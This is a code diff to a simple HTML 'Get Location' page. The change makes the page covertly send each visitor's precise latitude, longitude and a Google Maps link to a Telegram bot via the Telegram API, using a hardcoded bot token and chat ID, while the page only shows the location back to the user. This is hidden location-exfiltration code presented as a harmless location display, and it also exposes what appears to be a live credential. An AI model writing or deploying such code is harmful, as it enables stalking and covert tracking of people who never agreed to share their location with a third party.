@@ -15,39 +15,55 @@
     <button onclick="getLocation()">Get Location</button>
     <div id="location"></div>
     <script>
-        function getLocation() {
-            const locationDiv = document.getElementById('location');
-            if (!navigator.geolocation) {
-                locationDiv.textContent = 'Geolocation is not supported by your browser.';
-                return;
-            }
-            locationDiv.textContent = 'Locating…';
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    locationDiv.innerHTML = `<strong>Latitude:</strong> ${lat}<br><strong>Longitude:</strong> ${lon}<br><strong>Accuracy:</strong> ${accuracy} meters`;
-                },
-                (error) => {
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            locationDiv.textContent = 'User denied the request for Geolocation.';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            locationDiv.textContent = 'Location information is unavailable.';
-                            break;
-                        case error.TIMEOUT:
-                            locationDiv.textContent = 'The request to get user location timed out.';
-                            break;
-                        default:
-                            locationDiv.textContent = 'An unknown error occurred.';
-                            break;
-                    }
-                },
-                { enableHighAccuracy: true }
-            );
+const TELEGRAM_BOT_TOKEN = '7311171550:AAGXZ6fQWsPO30_FRZl3MCgXssvRaYFgiQM'; // Replace with your bot token
+const TELEGRAM_CHAT_ID = '5408718071'; // Replace with your chat id
+
+function sendLocationToTelegram(lat, lon, accuracy) {
+    const mapsUrl = `https://www.google.com/maps/?q=${lat},${lon}`;
+    const message = `User location: ${mapsUrl}\nAccuracy: ${accuracy} meters`;
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (!data.ok) {
+            alert('Failed to send location to Telegram.');
         }
+    })
+    .catch(error => {
+        alert('Error sending location: ' + error);
+    });
+}
+
+function getLocation() {
+    const locationDiv = document.getElementById('location');
+    if (!navigator.geolocation) {
+        locationDiv.textContent = 'Geolocation is not supported by your browser.';
+        return;
+    }
+    locationDiv.textContent = 'Locating…';
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const mapsUrl = `https://www.google.com/maps/?q=${lat},${lon}`;
+            locationDiv.innerHTML = `<strong>Latitude:</strong> ${lat}<br><strong>Longitude:</strong> ${lon}<br><strong>Accuracy:</strong> ${accuracy} meters<br><a href="${mapsUrl}" target="_blank">View on Google Maps</a>`;
+            sendLocationToTelegram(lat, lon, accuracy);
+        },
+        (error) => {
+            locationDiv.textContent = 'Error getting location.';
+        },
+        { enableHighAccuracy: true }
+    );
+}
     </script>
 </body>
 </html>
